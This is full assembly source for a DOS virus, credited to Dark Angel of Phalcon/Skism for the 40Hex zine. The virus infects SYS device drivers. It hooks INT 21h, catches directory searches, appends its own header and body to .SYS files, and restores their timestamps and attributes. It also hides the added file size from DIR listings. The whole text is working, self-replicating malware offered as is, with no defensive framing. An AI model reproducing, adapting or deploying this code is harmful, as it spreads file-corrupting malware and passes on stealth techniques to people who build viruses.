  ;Sysinf.asm????
  
  .model tiny
  .code
  org 0                           ; SYS files originate at zero
  
  ; SYS infector
  ; Written by Dark Angel of Phalcon/Skism
  ; for 40Hex
  
  header:
  
  next_header dd -1               ; FFFF:FFFF
  attribute   dw  8000h           ; character device
  strategy    dw  offset _strategy
  interrupt   dw  offset _interrupt
  namevirus   db  'SYS INF '      ; simple SYS infector
  
  endheader:
  
  author      db  0,'Simple SYS infector',0Dh,0Ah
              db    'Written by Dark Angel of Phalcon/Skism',0
  
  _strategy:  ; save es:bx pointer
          push    si
          call    next_strategy
  next_strategy:
          pop     si
          mov     cs:[si+offset savebx-offset next_strategy],bx
          mov     cs:[si+offset savees-offset next_strategy],es
          pop     si
          retf
  
  _interrupt:  ; install virus in memory
          push    ds                      ; generally, only the segment
          push    es                      ; registers need to be preserved
  
          push    cs
          pop     ds
  
          call    next_interrupt
  next_interrupt:
          pop     bp
          les     bx,cs:[bp+savebx-next_interrupt] ; get request header pointer
  
          mov     es:[bx+3],8103h         ; default to fail request
          cmp     byte ptr es:[bx+2], 0   ; check if it is installation request
          jnz     exit_interrupt          ; exit if it is not
  
          mov     es:[bx+10h],cs          ; fill in ending address value
          lea     si,[bp+header-next_interrupt]
          mov     es:[bx+0eh],si
          dec     byte ptr es:[bx+3]      ; and assume installation failure
  
          mov     ax, 0b0fh               ; installation check
          int     21h
          cmp     cx, 0b0fh
          jz      exit_interrupt          ; exit if already installed
  
          add     es:[bx+0eh],offset endheap ; fixup ending address
          mov     es:[bx+3],100h          ; and status word
  
          xor     ax,ax
          mov     ds,ax                   ; ds->interrupt table
          les     bx,ds:[21h*4]           ; get old interrupt handler
          mov     word ptr cs:[bp+oldint21-next_interrupt],bx
          mov     word ptr cs:[bp+oldint21+2-next_interrupt],es
  
          lea     si,[bp+int21-next_interrupt]
          cli
          mov     ds:[21h*4],si           ; replace int 21h handler
          mov     ds:[21h*4+2],cs
          sti
  exit_interrupt:
          pop     es
          pop     ds
          retf
  
  int21:
          cmp     ax,0b0fh                ; installation check?
          jnz     notinstall
          xchg    cx,ax                   ; mark already installed
  exitint21:
          iret
  notinstall:
          pushf
          db      9ah                     ; call far ptr  This combined with the
  oldint21 dd     ?                       ; pushf simulates an int 21h call
  
          pushf
  
          push    bp
          push    ax
  
          mov     bp, sp                  ; set up new stack frame
                                          ; flags         [bp+10]
                                          ; CS:IP         [bp+6]
                                          ; flags new     [bp+4]
                                          ; bp            [bp+2]
                                          ; ax            [bp]
          mov     ax, [bp+4]              ; get flags
          mov     [bp+10], ax             ; replace old flags with new
  
          pop     ax                      ; restore the stack
          pop     bp
          popf
  
          cmp     ah, 11h                 ; trap FCB find first and
          jz      findfirstnext
          cmp     ah, 12h                 ; FCB find next calls only
          jnz     exitint21
  findfirstnext:
          cmp     al,0ffh                 ; successful findfirst/next?
          jz      exitint21               ; exit if not
  
          push    bp
          call    next_int21
  next_int21:
          pop     bp
          sub     bp, offset next_int21
  
          push    ax                      ; save all registers
          push    bx
          push    cx
          push    dx
          push    ds
          push    es
          push    si
          push    di
  
          mov     ah, 2fh                 ; ES:BX <- DTA
          int     21h
  
          push    es                      ; DS:BX->DTA
          pop     ds
  
          cmp     byte ptr [bx], 0FFh     ; extended FCB?
          jnz     regularFCB              ; continue if not
          add     bx, 7                   ; otherwise, convert to regular FCB
  regularFCB:
          mov     cx, [bx+29]             ; get file size
          mov     word ptr cs:[bp+filesize], cx
  
          push    cs                      ; ES = CS
          pop     es
  
          cld
  
          ; The following code converts the FCB to an ASCIIZ string
          lea     di, [bp+filename]       ; destination buffer
          lea     si, [bx+1]              ; source buffer - filename
  
          cmp     word ptr [si],'OC'      ; do not infect CONFIG.SYS
          jz      bombout
  
          mov     cx, 8                   ; copy up to 8 bytes
  back:   cmp     byte ptr ds:[si], ' '   ; is it a space?
          jz      copy_done               ; if so, done copying
          movsb                           ; otherwise, move character to buffer
          loop    back
  
  copy_done:
          mov     al, '.'                 ; copy period
          stosb
  
          mov     ax, 'YS'
          lea     si, [bx+9]              ; source buffer - extension
          cmp     word ptr [si], ax       ; check if it has the SYS
          jnz     bombout                 ; extension and exit if it
          cmp     byte ptr [si+2], al     ; does not
          jnz     bombout
          stosw                           ; copy 'SYS' to the buffer
          stosb
  
          mov     al, 0                  ; copy null byte
          stosb
  
          push    ds
          pop     es                      ; es:bx -> DTA
  
          push    cs
          pop     ds
  
          xchg    di,bx                   ; es:di -> DTA
                                          ; open file, read/only
          call    open                    ; al already 0
          jc      bombout                 ; exit on error
  
          mov     ah, 3fh                 ; read first
          mov     cx, 2                   ; two bytes of
          lea     dx, [bp+buffer]         ; the header
          int     21h
  
          mov     ah, 3eh                 ; close file
          int     21h
  
  InfectSYS:
          inc     word ptr cs:[bp+buffer] ; if first word not FFFF
          jz      continueSYS             ; assume already infected
                                          ; this is a safe bet since
                                          ; most SYS files do not have
                                          ; another SYS file chained on
  
  alreadyinfected:
          sub     es:[di+29], heap - header ; hide file size increase
                                          ; during a DIR command
                                          ; This causes CHKDSK errors
         ;sbb     word ptr es:[di+31], 0  ; not needed because SYS files
                                          ; are limited to 64K maximum
  
  bombout:
          pop     di
          pop     si
          pop     es
          pop     ds
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          pop     bp
          iret
  
  continueSYS:
          push    ds
          pop     es
  
          lea     si, [bp+offset header]
          lea     di, [bp+offset bigbuffer]
          mov     cx, offset endheader - offset header
          rep     movsb
  
          mov     cx, cs:[bp+filesize]
          add     cx, offset _strategy - offset header  ; calculate offset to
          mov     word ptr [bp+bigbuffer+6],cx            ; strategy routine
  
          add     cx, offset _interrupt - offset _strategy;calculate offset to
          mov     word ptr cs:[bp+bigbuffer+8], cx        ; interrupt routine
  
  continueinfection:
          mov     ax, 4300h               ; get file attributes
          lea     dx, [bp+filename]
          int     21h
  
          push    cx                      ; save attributes on stack
          push    dx                      ; save filename on stack
  
          mov     ax, 4301h               ; clear file attributes
          xor     cx, cx
          lea     dx,[bp+filename]
          int     21h
  
          call    openreadwrite
  
          mov     ax, 5700h               ; get file time/date
          int     21h
          push    cx                      ; save them on stack
          push    dx
  
          mov     ah, 40h                 ; write filesize to the old
          mov     cx, 2                   ; SYS header
          lea     dx, [bp+filesize]
          int     21h
  
          mov     ax, 4202h               ; go to end of file
          xor     cx, cx
          cwd                             ; xor dx, dx
          int     21h
  
          mov     ah, 40h                 ; concatenate header
          mov     cx, offset endheader - offset header
          lea     dx, [bp+bigbuffer]
          int     21h
  
          mov     ah, 40h                 ; concatenate virus
          mov     cx, offset heap - offset endheader
          lea     dx, [bp+endheader]
          int     21h
  
          mov     ax, 5701h               ; restore file time/date
          pop     dx
          pop     cx
          int     21h
  
          mov     ah, 3eh                 ; close file
          int     21h
  
          mov     ax, 4301h               ; restore file attributes
          pop     cx
          pop     dx
          int     21h
  
          jmp     bombout
  
  openreadwrite:
          mov     al, 2                   ; open read/write mode
  open:   mov     ah, 3dh
          lea     dx,[bp+filename]
          int     21h
          xchg    ax, bx                  ; put handle in bx
          ret
  
  heap:
  savebx   dw      ?
  savees   dw      ?
  buffer   db      2 dup (?)
  filename db     13 dup (?)
  filesize dw     ?
  bigbuffer db    offset endheader - offset header dup (?)
  endheap:
  
  end header
